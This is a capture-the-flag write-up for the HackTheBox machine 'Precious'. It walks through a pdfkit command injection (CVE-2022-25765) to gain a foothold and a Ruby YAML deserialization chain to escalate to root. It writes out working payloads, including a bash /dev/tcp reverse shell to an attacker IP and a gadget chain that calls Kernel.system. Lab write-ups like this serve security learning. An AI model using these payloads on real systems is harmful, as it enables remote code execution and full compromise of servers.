# HackTheBox - Precious

## NMAP

```bash
Nmap scan report for 10.10.11.189
Host is up (1.5s latency).
Not shown: 63496 closed tcp ports (reset), 2037 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80 (HTTP)

Visting the web server, it redirects to `precious.htb`

<img src="https://i.imgur.com/Ld0tHX7.png"/>

Adding the domain in `/etc/hosts` file

<img src="https://i.imgur.com/7FsxbA0.png"/>

<img src="https://i.imgur.com/ZzRDFK3.png"/>

It says about entering a url which will convert it into a pdf file, on trying `http://localhost` and `http://127.0.0.1` it doesn't allow them

<img src="https://i.imgur.com/GGmVDAr.png"/>

Trying a remote url did worked

<img src="https://i.imgur.com/RBYJpij.png"/>

## Foothold

Running `exiftool` on the generated pdf, we'll see the version of `pdfkit`

<img src="https://i.imgur.com/Mo0bqua.png"/>

Which reveals that there exists a `CVE-2022-25765` and it's vulnerable to command injection

<img src="https://i.imgur.com/MqX04gZ.png"/>


Following the commits being made on pdfkit and snyk, it needs `http://` at the begninig and the with back ticks we can can include shell comamnd

```bash
http://%20`ping 10.10.14.72`
```

<img src="https://i.imgur.com/dMbsAVT.png"/>

<img src="https://i.imgur.com/PH7MxYm.png"/>

```bash
http://%20`/bin/bash -c "bash -i >& /dev/tcp/10.10.14.72/4444 0>&1"`
```

<img src="https://i.imgur.com/kv5AW7k.png"/>

Running pspy doesn't show anything interesting

<img src="https://i.imgur.com/fAaznTO.png"/>

## Privilege Escalation (henry)

Going into `ruby`'s home directory, we can see `.bundle` foldder which has `henry`'s password

<img src="https://i.imgur.com/ooNjLyD.png"/>

Doing `sudo -l` we can see this user can run `/opt/update_dependencies.rb file as root user

<img src="https://i.imgur.com/M37Vmhh.png"/>
This script will read try to read `dependency.yaml` file and will compare `yaml` and `pdfkit` it's version 

<img src="https://i.imgur.com/oNUylBI.png"/>

<img src="https://i.imgur.com/DzXfsTy.png"/>

Since it's reading yaml, this can absued with yaml deserilization and it's vulnerable because of `yaml.load`

<img src="https://i.imgur.com/QqWjzI6.png"/>

```yaml
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

<img src="https://i.imgur.com/T5o1ORH.png"/>

## References

- https://github.com/advisories/GHSA-rhwx-hjx2-x4qr
- https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md

